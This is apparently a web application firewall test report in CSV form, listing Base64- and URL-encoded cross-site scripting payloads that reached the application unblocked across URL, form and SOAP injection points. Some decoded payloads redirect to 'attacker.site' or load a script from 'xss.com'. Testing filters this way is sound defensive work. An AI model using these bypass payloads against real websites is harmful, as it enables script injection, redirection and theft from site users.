Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
PElNRyBTUkM9aiYjWDQxdmFzY3JpcHQ6YWxlcnQoJ3Rlc3QnKT4,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Im9ud2hlZWw9ZWFkKDExMSk,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Im9ud2hlZWw9ZWFkKDExMSk,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Im9ud2hlZWw9ZWFkKDExMSk,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Im9ud2hlZWw9ZWFkKDExMSk,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
X19wcm90b19fW3YtaWZdPV9jLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCk,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
c29tZXRleHQ8c3ZnIG9ubG9hZD1hbGVydChkb2N1bWVudC5kb21haW4pPj9taW1lVHlwZT10ZXh0L2h0bWw,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
IikpO2lmKCFzZWxmLngpc2VsZi54PSFhbGVydChkb2N1bWVudC5kb21haW4pfWNhdGNoKGUpe30vLw,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KGRvY3VtZW50LmRvbWFpbik+L2FsbA,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Y29uZmlybS5jYWxsKG51bGwsMSk,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Y29uZmlybS5jYWxsKG51bGwsMSk,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Y29uZmlybS5jYWxsKG51bGwsMSk,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Y29uZmlybS5jYWxsKG51bGwsMSk,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
confirm.call%28null%2C1%29,passed,200,URLPath,URL,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnYWxlJysncnQoZG9jdW1lbnQuZG9tYWluKScp,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnZmV0JysnY2goZG9jdW1lbnQuZG9tYWluKScp,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgnY29uJysnZmlybShkb2N1bWVudC5kb21haW4pJyk,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
amF2YXNjcmlwdDpzZXRJbnRlcnZhbCgncHJvbScrJ3B0KGRvY3VtZW50LmRvbWFpbiknKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuY2FsbCglMjAsICJYU1MiKTs,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
alert.call%28%2520%2C%20%22XSS%22%29%3B,passed,200,URLPath,URL,owasp,xss-scripting,failed
KGFsZXJ0KSgxKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
KGFsZXJ0KSgxKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
KGFsZXJ0KSgxKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
KGFsZXJ0KSgxKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
PHN2Zy9vbmxvYWQ9YWxlcnQoPVJORD0pLy8,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Im9uQ2xpY2s9Iihwcm9tcHQpKDEp,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Jz5hbGVydCgxKTwvc2NyaXB0PjxzY3JpcHQvMT0n,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Ik9ueD0oKSBvbk1vdVNlb1Zlcj1wcm9tcHQoMSk+,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Ii8vT254PSIiLy9vbmZvY3VzPXByb21wdCgxKT4,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
cHJvbXB0LmNhbGwobnVsbCwxKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
cHJvbXB0LmNhbGwobnVsbCwxKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ik9uQ2xpQ2s9Iihwcm9tcHRgMWAp,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
prompt.call%28null%2C1%29,passed,200,URLPath,URL,owasp,xss-scripting,failed
cHJvbXB0LmNhbGwobnVsbCwxKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
cHJvbXB0LmNhbGwobnVsbCwxKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
alert.apply%28null%2C%20%5B1%5D%29,passed,200,URLPath,URL,owasp,xss-scripting,failed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
YWxlcnQuYXBwbHkobnVsbCwgWzFdKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Jmx0O3N2Zy9vbmxvYWQmZXF1YWxzO2FsZXJ0KDEpJmd0Ow,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ij48cCBvbmx5PTEzMzcgb25tb3VzZWVudGVyPXdpbmRvdy5sb2NhdGlvbi5ocmVmPS8vYXR0YWNrZXIuc2l0ZT4,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
XCJhdXRvZjx4Pm9jdXMgbzx4Pm5mb2N1cz1hbGVydDx4PigxKS8v,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
Ij48c3ZnIG9ubW91c2VvdmVyPSJjb25maXJtJiMwMDAwMDAwMDQwZG9jdW1lbnQuZG9tYWluKQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
PDxzY3IAaXB0L3NyYz1odHRwOi8veHNzLmNvbS94c3MuanM+PC9zY3JpcHQ,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Jy1hbGVydCgxKS8v,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
Jy1hbGVydCgxKS8v,passed,200,URLPath,Base64Flat,owasp,xss-scripting,failed
Jy1hbGVydCgxKS8v,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
Jy1hbGVydCgxKS8v,passed,200,HTMLMultipartForm,Base64Flat,owasp,xss-scripting,failed
"alert.call(%20, ""XSS"");",passed,200,SOAPBody,Plain,owasp-api,soap,failed
"confirm.call(null,1)",passed,200,SOAPBody,Plain,owasp-api,soap,failed
"alert.apply(null, [1])",passed,200,SOAPBody,Plain,owasp-api,soap,failed
